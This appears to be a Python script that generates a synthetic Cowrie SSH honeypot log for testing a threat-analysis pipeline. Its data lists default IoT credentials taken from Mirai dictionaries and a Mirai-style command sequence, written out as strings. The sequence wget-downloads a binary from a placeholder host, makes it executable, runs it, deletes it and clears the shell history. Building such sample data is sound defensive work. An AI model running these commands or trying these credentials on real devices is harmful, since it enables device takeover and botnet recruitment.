#!/usr/bin/env python3
"""Generate data/sample/cowrie.sample.json — a small, deterministic, sanitised
capture so the pipeline (and CI) runs without a live sensor.

The IPs are documentation / reserved ranges; the behaviour mirrors real
Mirai-style SSH botnet activity.

    python _gen_sample.py
"""
from __future__ import annotations

import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "data" / "sample" / "cowrie.sample.json"
rng = random.Random(1337)

# TEST-NET / doc ranges stand in for real offenders, with plausible geo
SOURCES = [
    ("198.51.100.23", "CN"), ("198.51.100.87", "CN"), ("203.0.113.9", "RU"),
    ("203.0.113.44", "RU"), ("192.0.2.15", "US"), ("192.0.2.200", "IN"),
    ("198.51.100.140", "BR"), ("203.0.113.201", "VN"), ("192.0.2.77", "KR"),
]
CLIENTS = [
    "SSH-2.0-libssh2_1.9.0", "SSH-2.0-libssh2_1.10.0",
    "SSH-2.0-Go", "SSH-2.0-PUTTY", "SSH-2.0-paramiko_2.7.2",
]
# credential pairs pulled straight from public Mirai / IoT-botnet dictionaries
CREDS = [
    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), ("admin", "admin"),
    ("root", "888888"), ("root", "root"), ("root", "123456"), ("root", "54321"),
    ("support", "support"), ("root", "12345"), ("admin", "password"),
    ("root", "pass"), ("admin", "1234"), ("root", ""), ("user", "user"),
    ("root", "juantech"), ("root", "1111"), ("admin", "smcadmin"),
    ("root", "klv123"), ("Administrator", "admin"), ("ubnt", "ubnt"),
    ("root", "1234"), ("pi", "raspberry"), ("root", "default"),
]
ACCEPTED = {("root", "admin"), ("admin", "admin"), ("root", "root")}

MIRAI_CMDS = [
    "/bin/busybox MIRAI",
    "uname -a",
    "cat /proc/cpuinfo | grep name | head -n 1",
    "cat /proc/mounts",
    "free -m",
    "wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x",
    "chmod +x /tmp/.x",
    "/tmp/.x",
    "rm -rf /tmp/.x",
    "history -c",
]
DOWNLOADS = [
    ("http://198.51.100.250/bins/mirai.x86",
     "3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9"),
    ("http://203.0.113.201/a/kaiten.arm7",
     "9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5"),
]


def line(session, ip, eid, ts, **extra):
    return json.dumps(
        {"eventid": eid, "session": session, "src_ip": ip,
         "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
         "sensor": "honeypot", **extra},
        separators=(",", ":"),
    )


def main() -> None:
    OUT.parent.mkdir(parents=True, exist_ok=True)
    t = datetime(2026, 8, 12, 0, 4, 11, tzinfo=UTC)
    out: list[str] = []

    for _ in range(60):
        ip, _cc = rng.choice(SOURCES)
        session = f"{rng.randrange(16**12):012x}"
        t += timedelta(minutes=rng.randint(3, 220), seconds=rng.randint(0, 59))
        out.append(line(session, ip, "cowrie.session.connect", t,
                        src_port=rng.randint(1024, 65535), dst_port=22, protocol="ssh"))
        out.append(line(session, ip, "cowrie.client.version",
                        t + timedelta(milliseconds=120), version=rng.choice(CLIENTS)))

        tries = rng.randint(1, 6)
        creds = rng.sample(CREDS, k=min(tries, len(CREDS)))
        got_in = None
        for i, (u, p) in enumerate(creds):
            tt = t + timedelta(seconds=1 + i)
            if (u, p) in ACCEPTED and got_in is None:
                out.append(line(session, ip, "cowrie.login.success", tt, username=u, password=p))
                got_in = (u, p)
            else:
                out.append(line(session, ip, "cowrie.login.failed", tt, username=u, password=p))

        if got_in and rng.random() < 0.8:
            ct = t + timedelta(seconds=5)
            for cmd in MIRAI_CMDS[: rng.randint(4, len(MIRAI_CMDS))]:
                ct += timedelta(seconds=rng.randint(1, 4))
                out.append(line(session, ip, "cowrie.command.input", ct, input=cmd))
                if cmd.startswith("wget "):
                    url, sha = rng.choice(DOWNLOADS)
                    out.append(line(session, ip, "cowrie.session.file_download",
                                    ct + timedelta(milliseconds=800),
                                    url=url, outfile=f"var/lib/cowrie/downloads/{sha}",
                                    shasum=sha))
            t = ct

        out.append(line(session, ip, "cowrie.session.closed",
                        t + timedelta(seconds=rng.randint(2, 40)),
                        duration=round(rng.uniform(1.5, 45.0), 2)))

    OUT.write_text("\n".join(out) + "\n", encoding="utf-8")
    print(f"{OUT} — {len(out)} events")


if __name__ == "__main__":
    main()
